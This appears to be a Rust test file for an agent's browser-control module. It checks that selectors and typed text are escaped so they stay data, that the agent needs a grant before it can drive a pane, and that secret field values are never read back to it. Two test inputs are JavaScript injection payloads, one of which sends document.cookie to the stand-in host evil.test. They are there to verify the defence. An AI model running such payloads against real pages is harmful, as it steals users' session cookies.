//! An agent writing script into somebody's logged-in session, prevented.

use super::*;

/// The whole reason `as_json` exists. A selector pasted into source is an
/// agent writing JavaScript — and the page it would run in may be one US-026
/// just imported a session into.
#[test]
fn a_selector_that_tries_to_close_the_call_stays_data() {
    let nasty = "'); fetch('https://evil.test?c='+document.cookie); ('";
    let script = Act::Click {
        selector: nasty.to_owned(),
    }
    .script();

    /* The payload is in there — as a quoted literal, which a parser reads as
    a string and not as source.

    Presence is NOT the test, and my first attempt at this got it wrong:
    `'); fetch(` appears in the script either way, and what decides whether it
    is code is whether the literal around it is closed exactly once. */
    assert!(
        script.contains("evil.test"),
        "the selector vanished entirely"
    );

    let literal = as_json(nasty);
    assert_eq!(
        serde_json::from_str::<String>(&literal).unwrap(),
        nasty,
        "the literal does not read back as the value it carries"
    );
    assert_eq!(
        unescaped_quotes(&literal),
        2,
        "the literal is not closed exactly once: {literal}"
    );
}

/// Counts the quotes a JavaScript parser would treat as ending a string — the
/// ones no backslash precedes. A payload that escaped its literal would add
/// to this; one that stayed data never does.
fn unescaped_quotes(literal: &str) -> usize {
    let bytes = literal.as_bytes();
    (0..bytes.len())
        .filter(|at| bytes[*at] == b'"' && (*at == 0 || bytes[at - 1] != b'\\'))
        .count()
}

#[test]
fn typed_text_is_data_too_and_not_only_the_selector() {
    let script = Act::Type {
        selector: "#q".to_owned(),
        text: "\"; document.location='https://evil.test'; \"".to_owned(),
    }
    .script();
    assert!(script.contains("evil.test"), "the text vanished entirely");
    /* The quote the payload opens with arrives escaped, which is what keeps
    the rest of it inside the string rather than after it. */
    let literal = as_json("\"; document.location='https://evil.test'; \"");
    assert_eq!(unescaped_quotes(&literal), 2, "{literal}");
}

#[test]
fn a_quote_a_newline_and_a_backslash_all_survive_as_themselves() {
    for awkward in [
        "it's",
        "line\nbreak",
        "back\\slash",
        "\"quoted\"",
        "</script>",
    ] {
        assert_eq!(
            serde_json::from_str::<String>(&as_json(awkward)).unwrap(),
            awkward
        );
    }
}

/// A number formatted as a string would scroll by nothing and report success.
#[test]
fn a_scroll_is_a_number_and_a_nonsense_one_is_zero() {
    assert!(Act::Scroll { by: 1.5 }.script().contains("1.5"));
    assert!(Act::Scroll { by: f64::NAN }.script().contains('0'));
    assert!(!Act::Scroll { by: f64::NAN }.script().contains("NaN"));
    assert!(!Act::Scroll { by: f64::INFINITY }.script().contains("inf"));
}

/// An act against a page that moved on must say so rather than act on
/// whatever is there now.
#[test]
fn every_act_reports_a_missing_element_rather_than_acting_blindly() {
    for act in [
        Act::Click {
            selector: "#a".to_owned(),
        },
        Act::Type {
            selector: "#a".to_owned(),
            text: "x".to_owned(),
        },
    ] {
        assert!(act.script().contains("no element"), "{}", act.script());
    }
}

/// Nobody is driving anything until somebody says so.
#[test]
fn a_pane_starts_out_of_reach_and_can_be_taken_back() {
    let granted = Granted::default();
    assert!(
        !granted.allows("leaf_01"),
        "a pane was drivable before it was given"
    );

    granted.give("leaf_01");
    assert!(granted.allows("leaf_01"));
    /* And only that one. */
    assert!(!granted.allows("leaf_02"));

    granted.take_back("leaf_01");
    assert!(!granted.allows("leaf_01"));
}

/// What the pane draws while it happens, which is how a person watching sees
/// what is being done rather than reading about it afterwards.
#[test]
fn every_act_says_what_it_is_in_words() {
    assert!(Act::Click {
        selector: "#save".to_owned()
    }
    .said()
    .contains("#save"));
    assert!(Act::Type {
        selector: "#q".to_owned(),
        text: "secret".to_owned()
    }
    .said()
    .contains("#q"));
    /* And the typed text is NOT in it: what somebody types into a page can be
    a password, and this line is drawn on screen and kept. */
    assert!(!Act::Type {
        selector: "#q".to_owned(),
        text: "hunter2".to_owned()
    }
    .said()
    .contains("hunter2"));
}

/// The page is read as structure, and only what can actually be acted on.
#[test]
fn the_page_read_returns_json_about_what_is_on_screen() {
    assert!(READ_THE_PAGE.contains("JSON.stringify"));
    assert!(READ_THE_PAGE.contains("getBoundingClientRect"), "positions");
    assert!(READ_THE_PAGE.contains("aria-label"), "names");
    /* Bounded: a page's whole DOM is thousands of nodes and an agent's
    context is not free. */
    assert!(READ_THE_PAGE.contains("slice(0,200)"));
    assert!(
        READ_THE_PAGE.contains("innerHeight"),
        "only what is on screen"
    );
}

/// The worst defect this stage had, and no test of mine went near it: an
/// unlabelled input falls back to its own `value` for a name, so a password
/// written the `<label for>` way went to the agent as the element's name — and
/// into its transcript. Found in review.
#[test]
fn the_page_read_never_returns_what_is_typed_into_a_secret_field() {
    /* Guarded by type, and by what the field calls itself: `type=password`
    alone misses a one-time code, a CVC, and every site that rolls its own. */
    assert!(
        READ_THE_PAGE.contains("n.type==='password'"),
        "no password guard"
    );
    for named in ["pass", "secret", "token", "otp", "cvc", "creditcard"] {
        assert!(
            READ_THE_PAGE.contains(named),
            "nothing guards a field named {named}"
        );
    }
    assert!(
        READ_THE_PAGE.contains("autocomplete"),
        "autocomplete is what a well-written field says it holds"
    );

    /* The value is read into a variable that a secret field empties first —
    so there is no path from `n.value` to `name` for one. */
    assert!(
        READ_THE_PAGE.contains("hidden?'':(n.value||'')"),
        "the value is not gated"
    );
    assert!(
        !READ_THE_PAGE.contains("||n.value||"),
        "the ungated fallback to n.value is back"
    );

    /* What an agent does get: that the field is a secret one and whether it
    is filled. It needs both to reason; it never needs the contents. */
    assert!(READ_THE_PAGE.contains("secret:hidden"));
    assert!(READ_THE_PAGE.contains("filled:hidden?!!n.value:undefined"));
}

/// `serde_json` leaves U+2028 and U+2029 alone, and before ES2019 those ended
/// a string literal. Not exploitable on the engines this ships on — escaped
/// anyway, so the property does not depend on an assumption about somebody
/// else's engine that nothing would tell us had changed.
#[test]
fn the_two_separators_that_used_to_end_a_literal_are_escaped() {
    for raw in ["\u{2028}", "\u{2029}", "a\u{2028}b\u{2029}c"] {
        let literal = as_json(raw);
        assert!(!literal.contains('\u{2028}'), "{literal:?}");
        assert!(!literal.contains('\u{2029}'), "{literal:?}");
        /* And still reads back as itself, which is the point of escaping
        rather than stripping. */
        assert_eq!(serde_json::from_str::<String>(&literal).unwrap(), raw);
    }
}
